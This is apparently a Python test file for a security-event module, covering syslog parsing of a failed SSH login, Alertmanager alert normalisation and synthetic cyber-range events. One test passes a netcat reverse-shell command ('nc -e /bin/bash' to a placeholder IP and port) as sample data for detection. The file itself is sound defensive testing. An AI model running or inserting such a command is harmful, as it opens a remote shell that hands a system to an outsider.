from app.security.events import (
    create_synthetic_event,
    normalize_alertmanager_payload,
    parse_syslog_line,
)
from app.security.models import SecurityEvent


def test_security_event_model():
    event = SecurityEvent(
        source="test_source",
        event_type="auth_failure",
        user_id="admin",
        src_ip="192.168.1.10",
        severity="HIGH"
    )
    assert event.event_id is not None
    assert event.source == "test_source"
    assert event.severity == "HIGH"
    assert event.user_id == "admin"

def test_parse_syslog_line():
    line = "2026-09-15 08:00:00 Failed password for invalid user admin from 192.168.1.50 port 22 ssh2"
    event = parse_syslog_line(line)
    assert event.event_type == "auth_failure"
    assert event.severity == "HIGH"
    assert event.src_ip == "192.168.1.50"
    assert event.user_id == "admin"

def test_create_synthetic_event():
    event = create_synthetic_event(command="nc -e /bin/bash 1.2.3.4 4444")
    assert event.source == "synthetic_cyber_range"
    assert event.command == "nc -e /bin/bash 1.2.3.4 4444"
    assert event.severity == "HIGH"

def test_alertmanager_normalization():
    payload = {
        "alerts": [
            {
                "status": "firing",
                "labels": {"alertname": "UnauthorizedAccess", "severity": "critical"},
                "annotations": {"summary": "Root access from unexpected IP"}
            }
        ]
    }
    events = normalize_alertmanager_payload(payload)
    assert len(events) == 1
    assert events[0].severity == "HIGH"
    assert "alertmanager_unauthorizedaccess" in events[0].event_type
